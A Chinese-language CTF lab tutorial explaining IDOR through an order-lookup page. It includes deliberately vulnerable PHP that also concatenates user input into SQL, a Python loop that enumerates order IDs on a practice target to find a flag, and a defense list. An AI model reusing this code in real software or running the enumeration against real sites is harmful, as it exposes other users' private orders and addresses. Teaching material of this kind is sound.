# IDOR（不安全的直接对象引用）

## 概述

IDOR（Insecure Direct Object Reference）是一种越权漏洞，应用程序直接使用用户提供的 ID 来访问资源，没有验证权限。

## 漏洞代码

```php
<?php
$order_id = $_GET['order_id'];
$sql = "SELECT * FROM orders WHERE id = $order_id";
$result = mysqli_query($conn, $sql);
$order = mysqli_fetch_assoc($result);

echo "订单号: " . $order['id'];
echo "商品: " . $order['product'];
echo "金额: " . $order['amount'];
echo "地址: " . $order['address'];
?>
```

## 攻击方式

### 1. 遍历 ID

```
/order?id=1001  →  自己的订单
/order?id=1002  →  别人的订单
/order?id=1003  →  另一个订单
```

### 2. 自动化遍历

```python
import requests

for i in range(1000, 1100):
    r = requests.get(f'http://target.com/order?id={i}')
    if 'CR{' in r.text:
        print(f'Found flag at id={i}')
        print(r.text)
```

### 3. UUID 碰撞

如果 ID 是 UUID，无法遍历，但仍可通过信息泄露获得其他用户的 UUID。

## 与其他越权的区别

- **水平越权**：访问同级别用户的数据
- **垂直越权**：访问高权限功能
- **IDOR**：通过直接引用对象 ID 越权（是水平越权的一种具体实现）

## 防御

1. 使用不可预测的 ID（UUID）
2. 验证当前用户是否有权限访问该资源
3. 使用 Session 中的用户 ID，而非客户端传来的 ID

## 练习步骤

1. 查看自己的订单
2. 修改 `order_id` 参数遍历其他订单
3. 查找包含 flag 的订单

## flag

在订单数据中查找 `CR{...}` 格式的 flag。
